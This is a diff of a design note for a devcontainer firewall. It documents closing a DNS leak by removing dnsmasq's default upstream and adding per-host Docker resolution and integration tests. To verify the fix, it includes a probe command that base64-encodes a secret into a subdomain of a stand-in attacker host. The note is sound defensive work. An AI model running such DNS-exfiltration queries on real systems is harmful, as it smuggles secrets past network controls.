@@ -19,7 +19,7 @@ for the baseline architecture (lifecycle scripts, bind mounts, sudoers,
 firewall layers L1-L6). The text below complements it with the v2-relevant
 details.
 
-## DNS architecture today (the gap)
+## DNS architecture today (gap #9 closed in session 3)
 
 ### `dnsmasq.conf` baked at `/etc/devcontainer-firewall/dnsmasq.conf`
 
@@ -30,16 +30,19 @@ bind-interfaces
 no-resolv
 no-hosts
 
-# Default upstream for non-listed domains: Docker's internal resolver
-# (lets container names like theshop-db / redis / host.docker.internal resolve).
-server=127.0.0.11           # ← THE CATCH-ALL — v2 removes this line
+# No default upstream — non-allowlisted queries return REFUSED (gap #9 closed).
+# Sibling Docker peers are resolved by per-host server=/<name>/127.0.0.11
+# lines emitted at boot from direct-tcp-allow.txt ; host.docker.internal is
+# resolved by the ollama block's host-record= directive — both injected by
+# init-firewall.sh into the generated dnsmasq-domains.conf.
 
 cache-size=1000
 ```
 
-Without `server=127.0.0.11`, dnsmasq returns REFUSED for unmatched
-domains (no upstream available). The REFUSED response means the query
-is NOT forwarded upstream → no leak.
+Without any `server=` line as default upstream, dnsmasq returns REFUSED for
+unmatched domains. The REFUSED response means the query is NOT forwarded
+upstream → no leak. Empirically verified : `dig $(base64 secret).attacker.
+example.invalid @127.0.0.53` → `status: REFUSED`.
 
 ### Generated `/var/run/devcontainer-firewall/dnsmasq-domains.conf`
 
@@ -51,15 +54,22 @@ server=/api.anthropic.com/8.8.8.8           # explicit upstream override
 ipset=/api.anthropic.com/allowed-domains    # populate ipset with resolved IPs
 ```
 
-Plus, currently hardcoded in `init-firewall.sh:290-295`, for
-claude-bridge :
+Then `init-firewall.sh` injects, **after** the compile-policy output :
 
-```
-server=/claude-bridge/127.0.0.11            # local Docker resolver
-```
-
-V2 generalises this last pattern for every entry of
-`direct-tcp-allow.txt`.
+1. **Ollama block** (unchanged) — `host-record=host.docker.internal,$IP` +
+   `cname=ollama.{internal,local},host.docker.internal` + `local-ttl=3600`
+   (cf. ollama-local knowledge file for why local-ttl is required).
+2. **Unconditional claude-bridge override** (special-case) — strips the
+   auto-emitted `server=/claude-bridge/8.8.8.8` (which is wrong because
+   8.8.8.8 doesn't know about Docker peers) and emits
+   `server=/claude-bridge/127.0.0.11` instead. claude-bridge is always
+   declared in `docker-compose.yml` and always listed in `domains.txt`
+   regardless of mode, so the override is unconditional.
+3. **Generic sibling-resolve loop** (new in session 3) — iterates over
+   `direct-tcp-allow.txt`, skipping `host` (alias for
+   `host.docker.internal`, already handled) and `claude-bridge` (handled
+   above), emitting `server=/<host>/127.0.0.11` + `cname=<host>.local,
+   <host>` for each other entry.
 
 ### `init-firewall.sh` mode handling (modes : strict / basic / off)
 
@@ -72,30 +82,22 @@ V2 generalises this last pattern for every entry of
 V2 fixes the dnsmasq config, which is loaded in both `strict` AND
 `basic` modes. `off` mode unchanged (firewall bypassed by design).
 
-## Source-of-truth files for the v2 fix
+## Source-of-truth files for the v2 fix (state after session 3)
 
-### `templates/v2/firewall/dnsmasq.conf` (and `.devcontainer/firewall/dnsmasq.conf` mirror)
+### `templates/v2/firewall/dnsmasq.conf` (and `.devcontainer/firewall/dnsmasq.conf` mirror — both updated in session 3)
 
-Drop the `server=127.0.0.11` line. Optionally add a comment explaining
-that local Docker name resolution is now driven by per-host
-`server=/<name>/127.0.0.11` lines emitted at init-time from
-`direct-tcp-allow.txt`.
+`server=127.0.0.11` dropped. Comment explains that sibling DNS is now
+driven by per-host lines emitted by `init-firewall.sh` at boot.
 
-### `templates/v2/init-firewall.sh` (and mirror)
+### `templates/v2/init-firewall.sh` (and `.devcontainer/init-firewall.sh` mirror — both updated in session 3)
 
-Locate the hardcoded claude-bridge block (lines 290-295 currently) :
-
-```bash
-sed -i -E '/^server=\/claude-bridge\//d' "$GENERATED_DNSMASQ_CONF"
-cat >> "$GENERATED_DNSMASQ_CONF" <<'EOF'
-server=/claude-bridge/127.0.0.11
-EOF
-```
-
-Generalise to a loop over `direct-tcp-allow.txt` entries (one `host:port`
-per line, comments start with `#`, special keyword `host` = `host.docker.internal`).
-For each parsed `host` (port ignored at DNS level), emit
-`server=/<host>/127.0.0.11`.
+The old hardcoded claude-bridge block was kept as an **unconditional
+override** (since claude-bridge is always declared in compose AND always
+listed in domains.txt regardless of mode), followed by a **generic loop**
+over `direct-tcp-allow.txt` for any other Docker peer that needs sibling
+resolution. The loop skips `host` / `host.docker.internal` (ollama block
+handles those) and `claude-bridge` (handled by the unconditional override
+right above the loop, idempotent skip prevents double-emission).
 
 ### `templates/v2/firewall/direct-tcp-allow.txt` (already baked since v1 session 1)
 
@@ -116,15 +118,17 @@ stays available (already used for `*.statsig.com`,
 `*.gallerycdn.vsassets.io`, `*.githubusercontent.com`, `*.vo.msecnd.net`,
 `*.vsassets.io`) but no automatic promotion happens in v2.
 
-### `templates/v2/tests/integration/test-dns-strict.sh` (NEW)
+### `templates/v2/tests/integration/test-dns-strict.sh` (created in session 3)
 
-Tests to add :
+7 tests :
 
-- `dig non-existent-evil-domain.com @127.0.0.53` → REFUSED status (was : returns IP)
-- `dig api.anthropic.com @127.0.0.53` → returns IP (regression check)
-- `dig claude-bridge @127.0.0.53` → returns 127.0.0.11-resolved IP (sibling regression)
-- `dig host.docker.internal @127.0.0.53` → returns `192.168.65.254` (host-record regression)
-- For each entry of `direct-tcp-allow.txt` (decoded), dig the host → resolves
+- `test_poc9_evil_subdomain_refused` — `dig $(base64).attacker.example.invalid` → REFUSED ✅
+- `test_unlisted_random_refused` — random subdomain → REFUSED ✅
+- `test_allowlisted_anthropic_resolves` — api.anthropic.com → IPv4 ✅
+- `test_session2_bridge_resolves` — bridge.claudeusercontent.com → IPv4 ✅
+- `test_session2_codedocs_resolves` — code.claude.com → IPv4 ✅
+- `test_hostdockerinternal_resolves` — host.docker.internal → IPv4 (ollama block) ✅
+- `test_sibling_claudebridge_resolves_when_active` — claude-bridge → 172.x.x.x (skipped in cloud mode, exercised when claude-bridge:9223 active in direct-tcp-allow.txt)
 
 ## Threat model carryover
 
